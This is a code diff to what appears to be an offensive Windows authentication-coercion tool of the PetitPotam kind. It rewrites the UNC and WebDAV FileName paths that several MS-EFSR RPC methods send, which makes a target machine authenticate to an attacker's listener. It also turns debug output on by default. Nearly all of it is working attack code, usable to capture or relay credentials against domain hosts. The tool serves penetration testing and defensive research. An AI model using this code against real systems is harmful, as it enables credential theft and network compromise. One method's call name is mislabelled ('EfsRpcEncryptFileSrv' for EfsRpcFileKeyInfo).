@@ -98,10 +98,14 @@ class MS_EFSR(RPCProtocol):
     version = "1.0"
     available_pipes = [r"\PIPE\lsarpc", r"\PIPE\efsrpc"]
 
+    debug = True
+
     auth_type = RPC_C_AUTHN_WINNT
     auth_level = RPC_C_AUTHN_LEVEL_PKT_PRIVACY
 
     def EfsRpcOpenFileRaw(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcOpenFileRaw", 0
         if self.dce is not None:
             tries = 0
@@ -112,7 +116,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcOpenFileRaw()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['Flags'] = 0
@@ -138,6 +142,8 @@ class MS_EFSR(RPCProtocol):
             print("[!] Error: dce is None, you must call connect() first.")
 
     def EfsRpcEncryptFileSrv(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/0d599976-758c-4dbd-ac8c-c9db2a922d76
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcEncryptFileSrv", 4
         if self.dce is not None:
             tries = 0
@@ -148,7 +154,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcEncryptFileSrv()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
@@ -174,6 +180,8 @@ class MS_EFSR(RPCProtocol):
                 print("   [!] Error: dce is None, you must call connect() first.")
 
     def EfsRpcDecryptFileSrv(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/043715de-caee-402a-a61b-921743337e78
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcDecryptFileSrv", 5
         if self.dce is not None:
             tries = 0
@@ -184,7 +192,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcDecryptFileSrv()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['long'] = 0
@@ -210,6 +218,8 @@ class MS_EFSR(RPCProtocol):
             print("[!] Error: dce is None, you must call connect() first.")
 
     def EfsRpcQueryUsersOnFile(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/a058dc6c-bb7e-491c-9143-a5cb1f7e7cea
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcQueryUsersOnFile", 6
         if self.dce is not None:
             tries = 0
@@ -220,7 +230,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcQueryUsersOnFile()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
@@ -246,6 +256,8 @@ class MS_EFSR(RPCProtocol):
         return False
 
     def EfsRpcQueryRecoveryAgents(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/cf759c00-1b90-4c33-9ace-f51c20149cea
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcQueryRecoveryAgents", 7
         if self.dce is not None:
             tries = 0
@@ -256,7 +268,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcQueryRecoveryAgents()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     if self.debug:
@@ -281,6 +293,8 @@ class MS_EFSR(RPCProtocol):
             print("[!] Error: dce is None, you must call connect() first.")
 
     def EfsRpcFileKeyInfo(self, listener, max_retries=3):
+        # Microsoft docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/6813bfa8-1538-4c5f-982a-ad58caff3c1c
+        # Finding credits: @topotam77
         call_name, call_opnum = "EfsRpcEncryptFileSrv", 12
         if self.dce is not None:
             tries = 0
@@ -291,7 +305,7 @@ class MS_EFSR(RPCProtocol):
                 try:
                     request = EfsRpcFileKeyInfo()
                     if self.webdav_host is not None and self.webdav_port is not None:
-                        request['FileName'] = '%s@%d/%s\x00' % (self.webdav_host, self.webdav_port, gen_random_name())
+                        request['FileName'] = '\\\\%s@%d/%s\\%s\\file.txt\x00' % (self.webdav_host, self.webdav_port, gen_random_name(length=3), gen_random_name())
                     else:
                         request['FileName'] = '\\\\%s\\%s\\file.txt\x00' % (listener, gen_random_name())
                     request['InfoClass'] = 0
